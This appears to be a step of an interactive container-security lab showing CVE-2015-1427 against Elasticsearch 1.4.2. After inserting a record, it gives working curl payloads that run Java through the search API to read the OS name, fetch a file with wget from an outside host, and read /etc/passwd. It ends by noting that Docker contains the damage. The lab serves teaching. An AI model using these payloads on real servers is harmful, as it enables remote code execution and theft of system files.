This particular exploit took advantage of the Elasticsearch search capabilities. In order for the attack to work is requires data.

####Â Insert Data

Use cURL to add a record. ElasticSearch can take a minute to launch, so you may find it's not listening yet.

`curl -XPUT 'http://docker:9200/twitter/user/kimchy1' -d '{ "name" : "Shay Banon" }'`{{execute}}

# Exploit via CVE-2015-1427

With data inserted, we can now exploit the database. An empty instance is not vulnerable to the problem.

This particular version of Elasticsearch (1.4.2) allowed Java code to be used as part of the search. While whitelisting existed, there are other ways to gain access to the Java API required to potentially case damage.

In this case we're using Java to get access to the Operating System name.

`curl http://docker:9200/_search?pretty -XPOST -d '{"script_fields": {"myscript": {"script": "java.lang.Math.class.forName(\"java.lang.System\").getProperty(\"os.name\")"}}}'`{{execute}}

This command makes external HTTP requests to download additional files. HTTPBin echos the results on the HTTP request, but this could be additional applications to launch additional attacks.

`curl http://docker:9200/_search?pretty -XPOST -d '{"script_fields": {"myscript": {"script": "java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"wget -O /tmp/testy http://httpbin.org/get\")"}}}'`{{execute}}

Once the process has been started, we can read the file off disk.

`curl http://docker:9200/_search?pretty -XPOST -d '{"script_fields": {"myscript": {"script": "java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"cat /tmp/testy\").getText()"}}}'`{{execute}}

We can also read potentially sensitive files such as a _passwd_.

`curl http://docker:9200/_search?pretty -XPOST -d '{"script_fields": {"myscript": {"script": "java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"cat /etc/passwd\").getText()"}}}'`{{execute}}

Because we're running inside a container this won't expose information from our host. This default Docker security gives us huge advantages over running directly on the host.
